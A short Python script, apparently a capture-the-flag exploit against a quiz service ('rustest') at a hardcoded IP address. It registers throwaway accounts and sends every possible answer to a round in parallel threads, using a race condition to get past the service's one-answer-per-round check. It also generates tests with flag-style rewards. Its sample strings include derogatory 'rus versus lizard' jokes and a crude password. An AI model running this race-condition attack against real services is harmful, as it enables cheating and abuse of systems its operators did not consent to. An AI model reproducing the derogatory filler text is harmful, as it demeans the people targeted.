import base64
import threading
import uuid
import random

import requests as requests

# URL = 'http://localhost:3000'
URL = 'http://104.248.87.99:13337'
RUSTEST_ID = '12c09e1b-61f1-4b45-9ead-e8d150969256'


def get_question(test_id: str, token: str):
    return requests.get(
        f'{URL}/rustest/{test_id}/solve',
        headers={'Authorization': f'Bearer {token}'},
    ).json()


def submit_answer(test_id: str, token: str, answer: int, round_idx: int) -> dict:
    resp = requests.post(
        f'{URL}/rustest/{test_id}/submit',
        headers={'Authorization': f'Bearer {token}'},
        json={'round': round_idx, 'answer': answer}
    )

    try:
        return resp.json()
    except requests.exceptions.JSONDecodeError:
        return {'status_code': resp.status_code, 'error': resp.text}


def try_sploit_on_test_round(token: str, test_id: str, round_idx: int, num_answers: int) -> bool:
    threads = []
    responses = [None for _ in range(num_answers)]

    def make_resp(index: int):
        print(index)
        resp = submit_answer(test_id, token, index, round_idx)
        print(resp)
        responses[index] = resp

    for i in range(num_answers):
        threads.append(threading.Thread(
            target=(lambda idx: lambda: make_resp(idx))(i)
        ))

    for th in threads:
        th.start()

    for th in threads:
        th.join()

    rounds = [st.get('round', -1) for st in responses]
    print(rounds)
    return all(val == rounds[0] for val in rounds) and rounds[0] != -1


def register_user(login: str, password: str) -> str:
    resp = requests.post(f'{URL}/register', json=dict(login=login, password=password, bio="Ya nenavizhu yascherov"))
    return resp.json()['token']


def login_user(login: str, password: str) -> str:
    resp = requests.post(f'{URL}/login', json=dict(login=login, password=password))
    return resp.json()['token']


def create_rustest(token: str, rustest: dict) -> dict:
    resp = requests.post(f'{URL}/rustest', json=rustest, headers={
        'Authorization': f'Bearer {token}'
    })

    return resp.json()


QUESTION_NUM = 10
ANSWERS_AMOUNT = 4


def gen_test(test_idx: int, question_num: int, answers_num: int) -> dict:
    questions = []
    for i in range(question_num):
        allowed_answers = []
        for j in range(answers_num):
            allowed_answers.append(f'Гномий ответ {j + 1}')

        questions.append(
            {
                'question': f'Гномий вопрос {i + 1} в гномьем тесте {test_idx}',
                'allowed_answers': allowed_answers,
                'correct_idx': random.randint(0, answers_num - 1),
            }
        )

    return {
        'name': f'Великий гномий тест на русса {test_idx + 1}',
        'description': f'ВеликоГномий тест {test_idx + 1} позволят проверить русс ли гном или же ящер гнусный',
        'reward': f'GnomFlag{{velikaya_nagrada_{test_idx + 1}}}',
        'questions': questions,
    }


def main():
    test_id = '5f2c6d02-2afb-450c-81df-be46b868c3fd'
    win = 0
    lose = 0
    for attempt in range(1):
        token = register_user(base64.b32encode(random.randbytes(5)).decode().strip('='), 'penis228')
        print('registered')
        success = try_sploit_on_test_round(token, test_id, 0, 4)
        print(success)
        if success:
            win += 1
        else:
            lose += 1

    print(f'win: {win}')
    print(f'lose: {lose}')


if __name__ == '__main__':
    token = register_user(base64.b32encode(random.randbytes(5)).decode().strip('='), 'penis228')
    test = gen_test(1337, 10, 4)
    print(create_rustest(token, test))
    # main()
